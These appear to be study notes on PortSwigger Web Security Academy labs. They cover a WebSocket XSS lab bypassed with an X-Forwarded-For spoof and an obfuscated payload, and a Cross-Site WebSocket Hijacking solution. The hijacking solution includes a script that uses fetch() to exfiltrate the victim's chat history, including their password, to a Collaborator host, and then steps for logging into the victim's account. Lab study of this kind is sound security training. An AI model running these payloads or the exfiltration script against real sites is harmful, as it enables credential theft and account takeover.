- - -
- **Initial Test:** Send a standard XSS payload (e.g., `<img src=1 onerror='alert(1)'>`) via a WebSocket message.
- **Defense Activated:** The server detects the attack, blocks the message, terminates the WebSocket connection, and **bans the attacker's IP**.
- **Connection Failure:** Attempting to reconnect the WebSocket fails (due to the IP ban).
- **Step 1: Handshake Manipulation (IP Ban Bypass)**
    - In Burp Repeater, intercept the initial **handshake request** (the `GET` request that upgrades the connection to WebSocket).
    - Add the header: `X-Forwarded-For: 1.1.1.1`
    - Sending this manipulated handshake request successfully establishes a new WebSocket connection because the server believes it's from a different, unbanned IP.
- **Step 2: Filter Bypass (XSS Attack)**
    - Using this new connection, send an **obfuscated** XSS payload (e.g., ``<img src=1 oNeRrOr=alert`1`>``).
---
A portswigger lab demonstrates a **Cross-Site WebSocket Hijacking (CSWH)** vulnerability where an attacker can steal a victim's chat history, including their password, by forcing the victim's browser to initiate a malicious WebSocket connection.
solution:
1. Click "Live chat" and send a chat message.
2. Reload the page.
3. In Burp Proxy, in the WebSockets history tab, observe that the "READY" command retrieves past chat messages from the server.
4. In Burp Proxy, in the HTTP history tab, find the WebSocket handshake request. Observe that the request has no CSRF tokens.
5. Right-click on the handshake request and select "Copy URL".
6. In the browser, go to the exploit server and paste the following template into the "Body" section:
7. Replace `your-websocket-url` with the URL from the WebSocket handshake (`YOUR-LAB-ID.web-security-academy.net/chat`). Make sure you change the protocol from `https://` to `wss://`. Replace `your-collaborator-url` with a payload generated by Burp Collaborator.
8. Click "View exploit".
9. Poll for interactions in the Collaborator tab. Verify that the attack has successfully retrieved your chat history and exfiltrated it via Burp Collaborator. For every message in the chat, Burp Collaborator has received an HTTP request. The request body contains the full contents of the chat message in JSON format. Note that these messages may not be received in the correct order.
10. Go back to the exploit server and deliver the exploit to the victim.
11. Poll for interactions in the Collaborator tab again. Observe that you've received more HTTP interactions containing the victim's chat history. Examine the messages and notice that one of them contains the victim's username and password.
12. Use the exfiltrated credentials to log in to the victim user's account.
```html
<script>
var ws = new WebSocket('wss://your-websocket-url'); 
ws.onopen = function() { ws.send("READY"); }; 
ws.onmessage = function(event) { fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); }; 
</script>
```
---
